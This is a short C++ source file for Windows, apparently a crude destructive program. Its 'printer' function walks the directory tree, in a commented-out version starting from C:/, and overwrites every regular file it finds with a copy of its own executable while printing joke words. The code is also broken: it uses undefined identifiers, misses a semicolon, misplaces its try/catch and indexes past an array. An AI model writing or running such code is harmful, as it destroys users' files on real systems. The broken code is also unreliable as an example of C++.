#include <iostream>
#include <string>
#include <array>
#include <cstdlib>
#include <unistd.h>
#include <windows.h>
#include <fstream>
#include <filesystem>
#include <Windows.h>
#include <deque>
using namespace std;
string sWords[] = {"Lol","Mitze","Katze"};
string Chain = "";
namespace fs = std::filesystem

void printer()
{

for(std::deque<fs::path> directories{{str_to<std::string>(path)}} ; ! directories.empty() ; directories.pop_front()){
	try {
		for(fs::directory_iterator dit(directories.front()) ; dit != fs::directory_iterator() ; ++dit){
			if (fs::is_directory(dit->path())){
				directories.push_back(dit->path());
			}
			else if (fs::is_regular_file(dit->path())){
				Chain = Chain + sWords[rand() % 4];
				cout << Chain;
				CopyFile("./a.exe",entry.path().string().c_str(),0);
			}
		}
	}
}
	catch(...)
	{}
		/*
	std::string path = "C:/";
	for (const auto & entry : std::filesystem::recursive_directory_iterator(path,std::filesystem::directory_options::skip_permission_denied)){
		Chain = Chain + sWords[rand() % 4];
		cout << Chain;
		try {
			CopyFile("./a.exe",entry.path().string().c_str(),0);
		}
		catch (const std::exception& e){
		}
	}	*/
}
int main()
{
	printer();
}